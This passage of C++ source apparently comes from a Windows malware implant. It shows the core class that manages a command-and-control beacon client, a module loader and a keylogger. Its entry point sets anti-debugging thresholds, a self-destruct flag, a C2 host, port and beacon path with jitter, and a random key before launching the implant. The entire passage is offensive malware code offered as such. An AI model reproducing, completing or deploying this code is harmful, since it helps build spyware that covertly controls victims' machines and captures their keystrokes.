        shutdown();
        return TF_STATUS_SUCCESS;
    }

    TF_FORCEINLINE void request_stop() TF_NOTHROW {
        if (state_ == STATE_RUNNING) state_ = STATE_STOPPING;
    }

    TF_FORCEINLINE tf_module* get_module_manager() TF_NOTHROW { return modules_.get(); }
    TF_FORCEINLINE tf_c2*     get_c2()              TF_NOTHROW { return c2_.get(); }
    TF_FORCEINLINE tf_keylogger* get_keylogger()    TF_NOTHROW { return keylogger_.get(); }

private:
    tf_core() TF_NOTHROW : state_(STATE_UNINITIALIZED) { ::memset(&cfg_, 0, sizeof(cfg_)); }
    ~tf_core() TF_NOTHROW { shutdown(); }

    enum : u32 {
        STATE_UNINITIALIZED = 0,
        STATE_INITIALIZED   = 1,
        STATE_RUNNING       = 2,
        STATE_STOPPING      = 3,
        STATE_SHUTDOWN      = 4,
    };

    tf_global_config          cfg_;
    volatile u32              state_;
    SRWLOCK                   state_lock_;
    std::unique_ptr<tf_c2>    c2_;
    std::unique_ptr<tf_module> modules_;
    std::unique_ptr<tf_keylogger> keylogger_;

    TF_FORCEINLINE void heartbeat() TF_NOTHROW {
        ::AcquireSRWLockShared(&state_lock_);
        ::ReleaseSRWLockShared(&state_lock_);
    }

    TF_FORCEINLINE void shutdown() TF_NOTHROW {
        if (state_ == STATE_SHUTDOWN) return;
        state_ = STATE_SHUTDOWN;
        if (keylogger_) keylogger_->stop();
        if (c2_) c2_->stop();
        if (modules_) modules_->unload_all();
    }
};

}

int __stdcall WinMainCRTStartup() {
    using namespace tf;

    tf_core::tf_global_config cfg = {};
    cfg.magic = TF_MAGIC;
    cfg.version = (TF_VERSION_MAJOR << 24) | (TF_VERSION_MINOR << 16) | TF_VERSION_BUILD;
    cfg.instance_id = (u64(TF_RDTSC()) << 32) ^ ::GetCurrentProcessId() ^ ::GetCurrentThreadId();
    cfg.flags = 0x00000001;
    cfg.antidebug_threshold = 30;
    cfg.self_destruct_on_fail = 0;
    cfg.max_modules = TF_MAX_MODULES;

    const char* host = "127.0.0.1";
    for (sz i = 0; i < ::strlen(host) && i < sizeof(cfg.c2.c2_host)-1; ++i)
        cfg.c2.c2_host[i] = host[i];
    cfg.c2.c2_port = 8080;
    const char* path = "/tf/beacon";
    for (sz i = 0; i < ::strlen(path) && i < sizeof(cfg.c2.c2_path)-1; ++i)
        cfg.c2.c2_path[i] = path[i];
    cfg.c2.beacon_min = TF_C2_BEACON_MIN;
    cfg.c2.beacon_max = TF_C2_BEACON_MAX;
    cfg.c2.jitter = 25;

    tf_crypto::tf_rng rng;
    rng.fill(cfg.c2.key, sizeof(cfg.c2.key));

    NTSTATUS s = tf_core::instance().initialize(&cfg);
    if (NT_SUCCESS(s)) {
        s = tf_core::instance().run();
    }

    ::NtTerminateProcess(::GetCurrentProcess(), s);
    return 0;
}

extern "C" {
    NTSTATUS __stdcall DllMainCRTStartup(HINSTANCE, ULONG, PVOID);
}
